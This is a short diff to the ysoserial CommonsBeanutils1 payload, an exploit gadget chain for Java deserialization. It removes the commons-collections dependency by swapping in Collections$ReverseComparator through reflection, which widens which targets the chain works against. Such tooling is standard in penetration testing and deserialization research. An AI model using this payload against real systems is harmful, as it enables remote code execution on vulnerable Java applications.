@@ -12,7 +12,7 @@ import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-logging:commons-logging:1.2"})
 @Authors({ Authors.FROHOFF })
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
@@ -29,6 +29,9 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
+        
+        // replace comparator
+        Reflections.setFieldValue(comparator, "comparator", Reflections.getFirstCtor("java.util.Collections$ReverseComparator").newInstance());
 
 		// switch contents of queue
 		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
